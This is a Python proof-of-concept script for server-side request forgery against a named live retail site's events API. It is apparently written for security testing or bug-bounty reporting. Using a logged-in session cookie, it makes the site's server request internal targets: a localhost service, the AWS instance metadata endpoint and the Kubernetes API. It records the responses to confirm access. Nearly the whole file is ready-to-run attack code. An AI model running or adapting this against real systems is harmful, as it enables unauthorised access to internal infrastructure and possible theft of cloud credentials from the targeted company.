#!/usr/bin/env python3
"""
SSRF Proof of Concept - Zooplus
Target: https://www.zooplus.de/zootopia-events/api/events/sites/1

Usage:
1. Set your session cookie below (SID_COOKIE)
2. Run: python ssrf_poc.py
"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# ============================================================================
# CONFIGURATION - Set your session cookie here
# ============================================================================
SID_COOKIE = "YOUR_SESSION_COOKIE_HERE"  # Get from browser after login
# ============================================================================

BASE_URL = "https://www.zooplus.de"
SSRF_ENDPOINT = "/zootopia-events/api/events/sites/1"

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json"
})
session.cookies.set("sid", SID_COOKIE, domain=".zooplus.de")

def test_ssrf(target_url, description):
    """Test SSRF with given target URL"""
    print(f"\n[*] Testing: {description}")
    print(f"    Target: {target_url}")
    
    try:
        resp = session.post(
            f"{BASE_URL}{SSRF_ENDPOINT}",
            json={"url": target_url},
            timeout=15,
            verify=False
        )
        
        print(f"    Status: {resp.status_code}")
        
        # Check for internal headers (proof of SSRF)
        internal_headers = {}
        for key in ['server', 'x-envoy-upstream-service-time', 'x-lambda-region']:
            if key in resp.headers:
                internal_headers[key] = resp.headers[key]
        
        if internal_headers:
            print(f"    Internal Headers Found:")
            for k, v in internal_headers.items():
                print(f"      {k}: {v}")
        
        return {
            "target": target_url,
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "response": resp.text[:200]
        }
    except Exception as e:
        print(f"    Error: {e}")
        return None

def main():
    print("=" * 70)
    print("SSRF Proof of Concept - Zooplus")
    print("=" * 70)
    
    if SID_COOKIE == "YOUR_SESSION_COOKIE_HERE":
        print("\n[!] ERROR: Set your session cookie in SID_COOKIE variable")
        print("    1. Login to www.zooplus.de in browser")
        print("    2. Open DevTools > Application > Cookies")
        print("    3. Copy 'sid' cookie value")
        return
    
    results = []
    
    # Test 1: Internal service (main proof)
    result = test_ssrf(
        "http://127.0.0.1:8080",
        "Internal Service (Header Reflection Proof)"
    )
    if result:
        results.append(result)
        if result.get("headers", {}).get("server") == "istio-envoy":
            print("\n" + "=" * 70)
            print(" 100% PROOF: server: istio-envoy header found!")
            print("   This is internal Istio service mesh header")
            print("   Cannot be faked from outside = SSRF CONFIRMED")
            print("=" * 70)
    
    # Test 2: AWS Metadata Service
    result = test_ssrf(
        "http://169.254.169.254/latest/meta-data/",
        "AWS Metadata Service"
    )
    if result:
        results.append(result)
    
    # Test 3: Kubernetes API
    result = test_ssrf(
        "https://kubernetes.default.svc/api/v1/namespaces",
        "Kubernetes API"
    )
    if result:
        results.append(result)
    
    # Save results
    output = {
        "timestamp": datetime.now().isoformat(),
        "endpoint": f"{BASE_URL}{SSRF_ENDPOINT}",
        "results": results
    }
    
    filename = f"logs/ssrf_proof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(output, f, indent=2)
    
    print(f"\n[+] Results saved to {filename}")

if __name__ == "__main__":
    main()
